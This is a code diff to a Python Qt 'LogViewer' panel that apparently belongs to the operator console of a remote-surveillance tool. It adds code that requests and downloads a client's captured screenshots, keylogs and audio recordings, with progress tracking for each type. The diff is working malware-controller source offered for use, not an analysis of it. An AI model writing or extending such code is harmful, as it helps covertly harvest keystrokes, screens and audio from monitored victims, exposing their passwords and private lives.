@@ -43,7 +43,7 @@ class LogViewer(QWidget, logViewerUi):
 
         # Triggers
         self.timeCalendar.clicked.connect(self.check_data_counts)
-        self.downloadButton.clicked.connect(self.download_data)
+        self.downloadButton.clicked.connect(self.download_logs)
 
         self.screenshotsTable.doubleClicked.connect(self.open_screenshot)
         self.keylogsTable.doubleClicked.connect(self.open_keylog)
@@ -173,10 +173,66 @@ class LogViewer(QWidget, logViewerUi):
 
 
     def download_logs(self):
+        self.update_date()
         download_info = {
-            'filter': self.downl
+            'filter': self.ignoreViewedCheck.isChecked(),
+            'client_id': self.client_id,
+            'date': self.date,
         }
-        self.moderator.send_msg()
+        self.moderator.send_msg(download_info, 'downloadLogs', module_id=self.module_id)
+        self.callback = self.recv_download_logs
+
+    def recv_download_logs(self, data):
+        self.downloading_screenshots_count = data['payload']['screenshots']
+        self.downloaded_screenshots = 0
+        self.downloading_keylogs_count = data['payload']['keylogs']
+        self.downloaded_keylogs = 0
+        self.downloading_audios_count = data['payload']['audios']
+        self.downloaded_audios = 0
+        # Prepar Progress Bar
+        self.downloadProgress.setHidden(False)
+        self.downloadedLabel.setHidden(False)
+        self.callback = self.recv_log
+
+    def recv_log(self, data):
+        type = data['payload']['type']
+        if type == 'screenshot':
+            self.downloaded_screenshots += 1
+            self.downloadProgress.setValue(self.downloaded_screenshots*100/self.downloading_screenshots_count)
+            self.downloadedLabel.setText('Downloaded {screenshot} Screenshots From {screenshots}'.format(
+                screenshot=self.downloaded_screenshots,
+                screenshots=self.downloading_screenshots_count
+            ))
+
+            # Add Screenshot Preview
+
+        elif type == 'keylog':
+            self.downloaded_keylogs += 1
+            self.downloadProgress.setValue(self.downloaded_keylogs*100/self.downloading_keylogs_count)
+            self.downloadedLabel.setText('Downloaded {keylog} Keylog From {keylogs}'.format(
+                keylog=self.downloaded_keylogs,
+                keylogs=self.downloading_keylogs_count
+            ))
+
+            # Add Keylog Preview
+
+        elif type == 'audio':
+            self.downloaded_audios += 1
+            self.downloadProgress.setValue(self.downloaded_audios*100/self.downloading_audios_count)
+            self.downloadedLabel.setText('Downloaded {audio} Audio From {audios}'.format(
+                audio=self.downloaded_audios,
+                audios=self.downloading_audios_count
+            ))
+
+            # Add Audio Preview
+
+        else:
+            # Prepar Progress Bar
+            self.downloadProgress.setHidden(True)
+            self.downloadedLabel.setHidden(True)
+            self.downloaded_screenshots = 0
+            self.downloaded_keylogs = 0
+            self.downloaded_audios = 0
 
     def download_data(self):
 
